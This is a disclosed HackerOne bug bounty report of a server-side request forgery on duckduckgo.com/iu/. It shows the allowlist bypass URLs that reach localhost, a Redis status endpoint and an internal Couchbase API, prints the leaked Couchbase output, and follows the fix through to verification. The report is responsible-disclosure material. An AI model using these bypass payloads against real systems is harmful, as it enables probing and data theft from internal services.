---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2018-09-09
submitted: 2018-08-23T18:18:39.196Z
bounty_usd: null
votes: 165
cve: []
program: "[[programs/duckduckgo|DuckDuckGo]]"
reporter: "d0nut"
source: "https://hackerone.com/reports/398641"
title: "SSRF on duckduckgo.com/iu/"
---
# SSRF on duckduckgo.com/iu/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 165 | **Program:** DuckDuckGo | **Disclosed:** 2018-09-09

- Report: [https://hackerone.com/reports/398641](https://hackerone.com/reports/398641)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2018-08-23T18:18:39.196Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Normally, a call to `https://duckduckgo.com/iu` contains a query parameter (`u`) with some path using the domain `yimg.com`. This call will succeed in most cases.
{F337121}

And if we change that path to something like `https://google.com` it's rejected.
{F337118}

However, it appears that the check that ensures that `yimg.com` is the target domain is solely based on whether or not that string appears in the url, independent of where. This means we can stuff it in a query parameter and bypass this check.

{F337120}

Furthermore, with this bypass we can hit localhost and perform a port scan (see [XSPA](https://indiatriks.blogspot.com/2012/07/xspa-cross-site-port-attack.html)). 

For example, I have been able to conclude that services are running on the following ports:
```
22
25
80
443
587
6380
6432
6767
6868
8000
```

Some of these services don't like talking HTTP (like `22` and `25`) so they never respond, but other services seem to talk HTTP and will return seemingly sensitive data about redis. 
For example:
`https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:
```
{
  "current_time": "2018-08-23T17:56:06",
  "deployment_environment": "prod",
  "redis_local_last_successful_ping": "2018-08-23T13:56:05",
  "redis_local_url": "redis://127.0.0.1:6380",
  "redis_regional_last_successful_ping": "2018-08-23T13:56:05",
  "redis_regional_url": "redis://cache-services.duckduckgo.com:6380",
  "stat_blocked_ips_removed_since_launch": 8787,
  "stat_blocked_ips_since_launch": 12185,
  "stat_ipset_blocks": 266,
  "stat_redis_local_messages_received": 3613,
  "stat_redis_regional_messages_received": 10211,
  "status": "up"
}
```

## Impact

This could be used to interact with services that are not intended to be exposed. This also enables an XSPA attack. Additionally, information disclosure about a redis service. 

Lastly, an attack on redis may be possible even though the requests seem restricted to http.

## Timeline

- **Report Filed**
- **2018-08-23** @d0nut: Oh, I see that duckduckgo doesn't have collaboration turned on for their HackerOne program. 

If this is rewardable with swag, would you be able to also award `https://hackerone.com/spicy` with swag? They collaborated with me on this report and I would feel bad if I was the only one who got something :(
- **2018-08-23** @d0nut: (It would be even better if you could enabled collaboration so I could invite them!)
- **2018-08-23** @d0nut: There also appears to be an interesting service that returns search suggestions on port 6767 .

I noticed that "SSRF on proxy" is out of scope but I'm not sure this is a separate proxy service since :80 and :443 are actually duckduckgo's site. As in, the SSRF to localhost on 80 or 443 resolves to duckduckgo. 

If I'm incorrect in this thinking, it might be helpful to update policy to call out what is a proxy and isn't for duckduckgo (like separate subdomains or certain endpoints). Thanks!
- **2018-08-23** @d0nut: I have access to a couch db database right now. There's an API endpoint I can call. This is probably critical now.
- **2018-08-23** @d0nut: Here is a URL you can use to test: https://duckduckgo.com/iu/?u=http://cache-services.duckduckgo.com:8091/pools/default/buckets?q=http://yimg.com/
- **2018-08-23** @d0nut: ```
[{"name":"botnet","bucketType":"memcached","authType":"none","saslPassword":"","proxyPort":11213,"replicaIndex":true,"uri":"/pools/default/buckets/botnet?bucket_uuid=573aed7706bb78f1884c01efd0f10911","streamingUri":"/pools/default/bucketsStreaming/botnet?bucket_uuid=573aed7706bb78f1884c01efd0f10911","localRandomKeyUri":"/pools/default/buckets/botnet/localRandomKey","controllers":{"compactAll":"/pools/default/buckets/botnet/controller/compactBucket","compactDB":"/pools/default/buckets/default/controller/compactDatabases","purgeDeletes":"/pools/default/buckets/botnet/controller/unsafePurgeBucket","startRecovery":"/pools/default/buckets/botnet/controller/startRecovery"},"nodes":[{"systemStats":{"cpu_utilization_rate":27.22710163111669,"swap_total":0,"swap_used":0,"mem_total":33737191424,"mem_free":5337153536},"interestingStats":{"cmd_get":492,"couch_docs_actual_disk_size":235428957137,"couch_docs_data_size":135860040563,"couch_spatial_data_size":0,"couch_spatial_disk_size":0,"couch_views_actual_disk_size":0,"couch_views_data_size":0,"curr_items":42313196,"curr_items_tot":39777489,"ep_bg_fetched":26,"get_hits":242,"mem_used":15435536286,"ops":1245,"vb_replica_curr_items":0},"uptime":"17550778","memoryTotal":33737191424,"memoryFree":5337153536,"mcdMemoryReserved":25739,"mcdMemoryAllocated":25739,"replication":1,"clusterMembership":"active","recoveryType":"none","status":"healthy","otpNode":"ns_1@127.0.0.1","thisNode":true,"hostname":"10.0.1.188:8091","clusterCompatibility":262149,"version":"4.5.1-2844-community","os":"x86_64-unknown-linux-gnu","ports":{"proxy":11211,"direct":11210},"services":["kv"]}],"stats":{"uri":"/pools/default/buckets/botnet/stats","directoryURI":"/pools/default/buckets/botnet/statsDirectory","nodeStatsListURI":"/pools/default/buckets/botnet/nodes"},"ddocs":{"uri":"/pools/default/buckets/botnet/ddocs"},"nodeLocator":"ketama","autoCompactionSettings":false,"uuid":"573aed7706bb78f1884c01efd0f10911","replicaNumber":0,"threadsNumber":3,"quota":{"ram":273678336,"rawRAM":273678336},"basicStats":{"quotaPercentUsed":18.58643023903799,"opsPerSec":518,"hitRatio":0.6626984126984127,"itemCount":208856,"memUsed":50867033},"evictionPolicy":"valueOnly","timeSynchronization":"disabled","bucketCapabilitiesVer":"","bucketCapabilities":["cbhello","nodesExt"]},{"name":"deep","bucketType":"memcached","authType":"none","saslPassword":"","proxyPort":11214,"replicaIndex":true,"uri":"/pools/default/buckets/deep?bucket_uuid=f95b42373da6bd8fdd51c93324229009","streamingUri":"/pools/default/bucketsStreaming/deep?bucket_uuid=f95b42373da6bd8fdd51c93324229009","localRandomKeyUri":"/pools/default/buckets/deep/localRandomKey","controllers":{"compactAll":"/pools/default/buckets/deep/controller/compactBucket","compactDB":"/pools/default/buckets/default/controller/compactDatabases","purgeDeletes":"/pools/default/buckets/deep/controller/unsafePurgeBucket","startRecovery":"/pools/default/buckets/deep/controller/startRecovery"},"nodes":[{"systemStats":{"cpu_utilization_rate":27.22710163111669,"swap_total":0,"swap_used":0,"mem_total":33737191424,"mem_free":5337153536},"interestingStats":{"cmd_get":492,"couch_docs_actual_disk_size":235428957137,"couch_docs_data_size":135860040563,"couch_spatial_data_size":0,"couch_spatial_disk_size":0,"couch_views_actual_disk_size":0,"couch_views_data_size":0,"curr_items":42313196,"curr_items_tot":39777489,"ep_bg_fetched":26,"get_hits":242,"mem_used":15435536286,"ops":1245,"vb_replica_curr_items":0},"uptime":"17550778","memoryTotal":33737191424,"memoryFree":5337153536,"mcdMemoryReserved":25739,"mcdMemoryAllocated":25739,"replication":1,"clusterMembership":"active","recoveryType":"none","status":"healthy","otpNode":"ns_1@127.0.0.1","thisNode":true,"hostname":"10.0.1.188:8091","clusterCompatibility":262149,"version":"4.5.1-2844-community","os":"x86_64-unknown-linux-gnu","ports":{"proxy":11211,"direct":11210},"services":["kv"]}],"stats":{"uri":"/pools/default/buckets/deep/stats","directoryURI":"/pools/default/buckets/deep/statsDirectory","nodeStatsListURI":"/pools/default/buckets/deep/nodes"},"ddocs":{"uri":"/pools/default/buckets/deep/ddocs"},"nodeLocator":"ketama","autoCompactionSettings":false,"uuid":"f95b42373da6bd8fdd51c93324229009","replicaNumber":0,"threadsNumber":3,"quota":{"ram":4116709376,"rawRAM":4116709376},"basicStats":{"quotaPercentUsed":80.05820960337813,"opsPerSec":194,"hitRatio":0.08633093525179857,"itemCount":2326851,"memUsed":3295763821},"evictionPolicy":"valueOnly","timeSynchronization":"disabled","bucketCapabilitiesVer":"","bucketCapabilities":["cbhello","nodesExt"]},{"name":"services","bucketType":"membase","authType":"none","saslPassword":"","proxyPort":11212,"replicaIndex":false,"uri":"/pools/default/buckets/services?bucket_uuid=06787b1d4c84027860a5f73efb508bff","streamingUri":"/pools/default/bucketsStreaming/services?bucket_uuid=06787b1d4c84027860a5f73efb508bff","localRandomKeyUri":"/pools/default/buckets/services/localRandomKey","controllers":{"compactAll":"/pools/default/buckets/services/controller/compactBucket","compactDB":"/pools/default/buckets/default/controller/compactDatabases","purgeDeletes":"/pools/default/buckets/services/controller/unsafePurgeBucket","startRecovery":"/pools/default/buckets/services/controller/startRecovery"},"nodes":[{"couchApiBase":"http://10.0.1.188:8092/services%2B06787b1d4c84027860a5f73efb508bff","systemStats":{"cpu_utilization_rate":27.22710163111669,"swap_total":0,"swap_used":0,"mem_total":33737191424,"mem_free":5337153536},"interestingStats":{"cmd_get":492,"couch_docs_actual_disk_size":235428957137,"couch_docs_data_size":135860040563,"couch_spatial_data_size":0,"couch_spatial_disk_size":0,"couch_views_actual_disk_size":0,"couch_views_data_size":0,"curr_items":42313196,"curr_items_tot":39777489,"ep_bg_fetched":26,"get_hits":242,"mem_used":15435536286,"ops":1245,"vb_replica_curr_items":0},"uptime":"17550778","memoryTotal":33737191424,"memoryFree":5337153536,"mcdMemoryReserved":25739,"mcdMemoryAllocated":25739,"replication":1,"clusterMembership":"active","recoveryType":"none","status":"healthy","otpNode":"ns_1@127.0.0.1","thisNode":true,"hostname":"10.0.1.188:8091","clusterCompatibility":262149,"version":"4.5.1-2844-community","os":"x86_64-unknown-linux-gnu","ports":{"proxy":11211,"direct":11210},"services":["kv"]}],"stats":{"uri":"/pools/default/buckets/services/stats","directoryURI":"/pools/default/buckets/services/statsDirectory","nodeStatsListURI":"/pools/default/buckets/services/nodes"},"ddocs":{"uri":"/pools/default/buckets/services/ddocs"},"nodeLocator":"vbucket","autoCompactionSettings":false,"uuid":"06787b1d4c84027860a5f73efb508bff","vBucketServerMap":{"hashAlgorithm":"CRC","numReplicas":0,"serverList":["10.0.1.188:11210"],"vBucketMap":[[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0],[0]]},"replicaNumber":0,"threadsNumber":3,"quota":{"ram":14271119360,"rawRAM":14271119360},"basicStats":{"quotaPercentUsed":84.70888041118592,"opsPerSec":533,"diskFetches":26,"itemCount":39777489,"diskUsed":235428957137,"dataUsed":135860040563,"memUsed":12088905432},"evictionPolicy":"valueOnly","timeSynchronization":"disabled","bucketCapabilitiesVer":"","bucketCapabilities":["cbhello","touch","couchapi","cccp","xdcrCheckpointing","nodesExt","dcp"]}]```

Looks important
- **2018-08-24** @d0nut: *couchbase not `couch db`.
- **Report Triaged**
- **2018-08-24** @d0nut: Hey, I would've fixed this yesterday (both figuratively and literally). This seems fairly bad.
- **Report Resolved**
- **Swag Awarded**
- **2018-08-25** @d0nut: Shoutout to Bug Bounty Forum and [Spicy](https://hackerone.com/spicy)
- **2018-08-25** @joystick: Nice finding @d0nut and @spicy. Please keep them coming!
- **2018-08-27** @d0nut: So.. uhh.. like you didn't fix the SSRF. 
This still works: https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com
- **2018-08-27** @d0nut: @tim_ddg
- **2018-08-27** @d0nut: And so does https://duckduckgo.com/iu/?u=http://cache-services.duckduckgo.com:8091/pools/?q=http://yimg.com/

I would copy and paste this just in case h1's link sanitization is doing something weird.

You should fix this.. but for real this time...
- **2018-08-28** @marcantonio: @d0nut we had to roll back this fix as it had some unintended consequences on our side. We are evaluating new solutions now.
- **2018-08-28** @d0nut: Happy to finally hear from you. Thanks for the update.
- **2018-08-29** @tim_ddg: Our apologies about the back and forth here -- a comprehensive fix has been deployed. Can you verify?
- **2018-08-29** @d0nut: May I ask what the comprehensive fix consists of? It would help in verifying there are no potential bypasses.
- **2018-08-29** @d0nut: As far as I can tell, you're using a regex similar to `^https?://(\w[\w-]+\.)*yimg\.com\/.*` for validation. While this wouldn't have been the remediation I would've proposed, it seems sufficient as I noticed that this SSRF doesn't follow redirects so you don't have to worry about open redirects.

There is the concern that if a user can control the content on any subdomain of yimg, you may still have XSS though.

Anyway, LGTM.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2018-10-08** @d0nut: Hey @tim_ddg ,
Was the swag sent out? I haven't seen anything in my mail yet :)
- **2018-10-11** @d0nut: Any news, @marcantonio / @tim_ddg ?
- **2018-10-15** @marcantonio: Hi @d0nut, I'm checking on this for you.
- **2018-10-15** @marcantonio: Hi @d0nut. I think this one got dropped. Did anyone from DDG ask for your shipping info? If not can you provide it here and I'll get it sent. We need name, address, and shirt size (M/F).
- **2018-10-15** @d0nut: 1. Yea, not on a publicly disclosed report :)
2. It should be attached to my h1 profile already. I had to fill it out there. The documentation says you should automatically receive the relevant information.
- **Swag Awarded**
- **2018-10-16** @marcantonio: @d0nut it's on its way! Sorry for the mixup.
- **2018-10-16** @d0nut: :D thanks @marcantonio 
Can't wait to tweet out whatever it ends up being haha
